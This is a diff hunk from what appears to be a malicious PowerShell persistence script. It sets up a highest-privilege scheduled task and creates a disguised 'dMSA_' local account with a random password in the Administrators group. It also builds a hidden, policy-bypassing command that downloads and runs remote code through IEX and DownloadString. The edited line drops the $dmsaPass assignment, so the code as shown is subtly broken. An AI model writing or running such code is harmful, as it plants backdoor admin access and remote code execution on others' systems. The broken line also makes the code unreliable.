@@ -316,7 +316,7 @@ schtasks /create /tn $taskName /xml $xmlTask /f /rl highest 2>$null
 
 # dMSA Local Account: Restart Persist (Random pass)
 $dmsaUser = "dMSA_$(Get-Random -Max 999)"
-$dmsaPass = [char[]](65..90 + 97..122 + 48..57) | Get-Random -Count 12 | -join ''
+-join ((65..90 + 97..122 + 48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
 New-LocalUser -Name $dmsaUser -Password (ConvertTo-SecureString $dmsaPass -AsPlainText -Force) -AccountNeverExpires -ErrorAction SilentlyContinue
 Add-LocalGroupMember -Group "Administrators" -Member $dmsaUser -ErrorAction SilentlyContinue
 $dmsaArg = if (Test-Path $localCopyPath) { "-WindowStyle Hidden -ep Bypass -f `"$localCopyPath`"" } else { "-WindowStyle Hidden -ep Bypass -Command `"IEX ((New-Object System.Net.WebClient).DownloadString('$scriptUrl'))`"" }
